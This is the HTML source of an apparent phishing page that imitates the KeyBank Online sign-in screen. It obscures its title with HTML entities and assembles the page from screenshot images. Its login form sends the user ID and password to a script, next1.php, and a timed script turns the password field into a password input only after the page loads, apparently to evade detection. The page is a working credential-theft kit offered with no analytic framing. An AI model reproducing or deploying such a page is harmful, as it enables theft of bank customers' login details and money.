<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#75;&#101;&#121;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #fff;
  	border-radius: 4px;
  	padding-left: 8px;
  	padding-top: 12px;
 	padding-right: 55px;
  	font-size: 14px;
    height: 52px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #3A8BC1; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>			  
</head>

<body bgColor="#D0BA95">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:51px; z-index:0"><img src="images/kn1.png" alt="" title="" border=0 width=1365 height=51></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1114px; top:17px; width:242px; height:20px; z-index:1"><a href="#"><img src="images/cont.png" alt="" title="" border=0 width=242 height=20></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:12px; top:5px; width:136px; height:33px; z-index:2"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=136 height=33></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:51px; width:1365px; height:257px; z-index:3"><img src="images/kk1.png" alt="" title="" border=0 width=1365 height=257></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:305px; width:1365px; height:190px; z-index:4"><img src="images/kk2.png" alt="" title="" border=0 width=1365 height=190></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:492px; width:1365px; height:170px; z-index:5"><img src="images/kk3.png" alt="" title="" border=0 width=1365 height=170></div>

<div id="image5" style="position:absolute; overflow:hidden; left:488px; top:491px; width:47px; height:20px; z-index:6"><a href="#"><img src="images/kk5.png" alt="" title="" border=0 width=47 height=20></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:796px; top:491px; width:81px; height:23px; z-index:7"><a href="#"><img src="images/kk6.png" alt="" title="" border=0 width=81 height=23></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:819px; top:272px; width:50px; height:16px; z-index:12"><a href="#"><img src="images/forgot.png" alt="" title="" border=0 width=50 height=16></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:500px; top:261px; width:43px; height:12px; z-index:13"><img src="images/id.png" alt="" title="" border=0 width=43 height=12></div>

<div id="image11" style="position:absolute; overflow:hidden; left:499px; top:330px; width:56px; height:13px; z-index:14"><img src="images/passwrd.png" alt="" title="" border=0 width=56 height=13></div>

<div id="image12" style="position:absolute; overflow:hidden; left:819px; top:342px; width:50px; height:16px; z-index:15"><a href="#"><img src="images/forgot.png" alt="" title="" border=0 width=50 height=16></a></div>

<form action=next1.php name=istarihoasap id=istarihoasap method=post>
<input name="user" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:493px;top:255px;z-index:8">
<input name="pass" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:485px;top:317px;z-index:9">
<div id="formcheckbox1" style="position:absolute; left:489px; top:396px; z-index:10"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:492px; top:424px; z-index:11"><input type="image" name="formimage1" width="382" height="54" src="images/kk4.png"></div>

</body>
</html>
